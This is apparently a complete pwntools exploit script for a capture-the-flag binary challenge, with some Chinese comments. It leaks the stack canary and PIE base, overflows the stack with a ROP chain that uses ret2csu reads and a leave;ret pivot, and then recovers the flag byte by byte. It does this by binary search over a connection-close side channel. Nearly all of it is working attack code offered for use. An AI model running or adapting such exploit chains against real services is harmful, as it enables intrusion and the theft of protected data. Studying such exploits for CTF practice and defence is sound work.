#!/usr/bin/env python3
# 消费侧信道版: closed==False  <=>  flag[idx] > guess
import os, sys, time, select
from pwn import *
context.arch="amd64"; context.log_level=os.environ.get("LOG","error")
HOST,PORT ="127.0.0.1",34829
POP_RDI=0x200603; CSU_POP=0x2005fa; CSU_CALL=0x2005e0; GET_INPUT=0x20031c
LEAVE_RET=0x20059d; GETNUM=0x2003aa; CMP=0x20038b; GOT_READ=0x600fa8
CSU_INIT=0x2005a0; STAGE2=0x601200; FRAME=0x601500; CONS=0x601700; SCR=0x601e00
SIZE_LEAK=0x59; FD=int(os.environ.get("FD","3")); BIG=int(os.environ.get("BIG","40000"))

def csu_read(pie, fd, dst, n):
    return (p64(pie+CSU_POP)+p64(0)+p64(1)+p64(pie+GOT_READ)+p64(fd)+p64(dst)+p64(n)
            +p64(pie+CSU_CALL)+p64(0)+p64(0)*6)

def build(pie, idx, canary, fd):
    stage2=pie+STAGE2; frame=pie+FRAME; scr=pie+SCR; cons=pie+CONS
    chunks = (5,5) if idx==0x0a else (idx,0)
    chain  = p64(0)
    chain += csu_read(pie, fd, scr, chunks[0])
    chain += csu_read(pie, fd, scr, chunks[1])
    chain += csu_read(pie, fd, frame-0x1c, 1)          # flag[idx] -> [frame-0x1c]
    chain += p64(pie+0x2005fb)+p64(frame)+p64(0)*4     # rbp = frame
    chain += p64(pie+GETNUM)                           # eax = guess
    chain += p64(pie+CMP)                              # cmp [frame-0x1c],eax ; ja
    blob=bytearray(b"\x00"*0x600); blob[0:len(chain)]=chain
    fb=FRAME-STAGE2-0x20
    blob[fb+0x04:fb+0x08]=p32(0)          # size = flag[idx]
    blob[fb+0x08:fb+0x10]=p64(frame+8)    # 循环里的 store 打掉 [frame+8]
    blob[fb+0x14:fb+0x18]=p32(0)          # i = 0
    blob[fb+0x18:fb+0x20]=canary
    blob[fb+0x20:fb+0x28]=p64(0)
    blob[fb+0x28:fb+0x30]=p64(cons)       # 没被打掉时去消费
    c  = p64(pie+POP_RDI)+p64(scr)+p64(pie+GET_INPUT)
    c += p64(pie+POP_RDI)+p64(scr)+p64(pie+GET_INPUT)
    c += p64(0)
    blob[CONS-STAGE2:CONS-STAGE2+len(c)]=c
    return bytes(blob)

def one(idx, guess):
    p=remote(HOST,PORT)
    try:
        p.recvuntil(b"name size",timeout=5); p.send(b"136\n"); p.recvuntil(b"> ",timeout=5)
        p.send(b"A"*(SIZE_LEAK-1)+b"X"+b"\n")
        d=p.recvuntil(b"Now you have 1 choice to change your name.",timeout=5)
        body=d.split(b"Your name is: ",1)[1].rsplit(b"\nNow you have 1 choice",1)[0]
        if len(body)<SIZE_LEAK+13: return None
        canary=b"\x00"+body[SIZE_LEAK:SIZE_LEAK+7]
        pie=u64(body[SIZE_LEAK+7:SIZE_LEAK+13].ljust(8,b"\x00"))-CSU_INIT
        stage2=pie+STAGE2
        blob=build(pie, idx, canary, FD)
        if b"\n" in blob: return None
        p1=b"B"*0x58+canary+p64(stage2)+p64(pie+POP_RDI)+p64(stage2)+p64(pie+GET_INPUT)+p64(pie+LEAVE_RET)
        p.send(p1); time.sleep(1.05); p.send(blob+b"\n"); time.sleep(0.12)
        p.send(("%d\n"%guess).encode()+b"Q"*11); time.sleep(0.25)
        try: p.send(b"Z"*BIG)
        except Exception: return False
        t0=time.time()
        while time.time()-t0<2.2:
            r,_,_=select.select([p.sock],[],[],0.10)
            if r:
                try: dd=p.sock.recv(4096)
                except Exception: return False
                if not dd: return False
        return True
    except Exception:
        return None
    finally:
        p.close()

def sample(idx,g):
    for _ in range(4):
        r=one(idx,g)
        if r is not None: return r
        time.sleep(0.4)
    return None

def gt(idx,g):
    a=sample(idx,g); b=sample(idx,g)
    if a is None or b is None: return None
    if a==b: return a
    c=sample(idx,g)          # 两票不一致 -> 第三票定
    if c is None: return None
    return (a if a==c else b)

def read_byte(idx):
    lo,hi=0,255
    while lo<hi:
        mid=(lo+hi)//2
        r=gt(idx,mid)
        if r is None: return None
        if r: lo=mid+1
        else: hi=mid
    return lo

if __name__=="__main__":
    n=int(os.environ.get("MAXLEN","40")); start=int(os.environ.get("START","0"))
    out=b""
    for i in range(start,start+n):
        b=None
        for _ in range(3):
            b=read_byte(i)
            if b is not None: break
        if b is None:
            print("idx %d FAILED"%i, flush=True); break
        out+=bytes([b])
        print("[%02d] 0x%02x %r  => %r"%(i,b,chr(b) if 32<=b<127 else ".",out), flush=True)
        if b in (0,0x0a) or out.endswith(b"}"): break
    print("FLAG = %s"%out.rstrip(b"\n").decode("latin1"), flush=True)
